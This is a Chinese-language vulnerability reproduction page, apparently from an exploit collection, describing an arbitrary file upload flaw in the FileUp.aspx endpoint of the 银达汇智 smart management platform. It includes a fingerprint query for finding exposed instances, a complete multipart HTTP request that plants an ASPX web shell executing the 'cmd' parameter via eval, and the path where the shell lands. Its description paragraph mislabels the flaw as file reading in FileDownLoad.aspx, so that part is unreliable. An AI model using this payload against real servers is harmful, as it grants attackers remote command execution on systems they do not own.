# 银达汇智 智慧综合管理平台 FileUp.aspx 任意文件上传漏洞

## 漏洞描述

银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件

## 漏洞影响

<a-checkbox checked>银达汇智 智慧综合管理平台 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>"汇智信息" && title=="智慧综合管理平台登入"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1627914977251-450973a6-e847-454b-817b-efa35fdc4aed.png)

文件上传请求包

```bash
POST /Module/FileUpPage/FileUp.aspx?orgid=1&type=NNewsContent HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 337
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=62907949903a4c499178971c9dab4ad9

--62907949903a4c499178971c9dab4ad9
Content-Disposition: form-data; name="Filedata"; filename="abc.aspx"
Content-Type: image/jpeg

<%@ Page Language="Jscript"%><%Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("abc", "MD5").ToLower());eval(Request.Item["cmd"],"unsafe");%>
--62907949903a4c499178971c9dab4ad9--
```

![img](../../../.vuepress/public/img/1629368451848-7ecbcd3e-82cc-4608-b9a9-a312826248ea.png)

响应包会返回文件名，上传的目录为

```bash
/imgnews/imgcontent/1/xxxxxxxxxx.aspx
```

![img](../../../.vuepress/public/img/1629368525052-fffda86a-30fa-4dc0-a3a0-537a0be5b5c3.png)

出现如图成功上传木马，密码为 `cmd`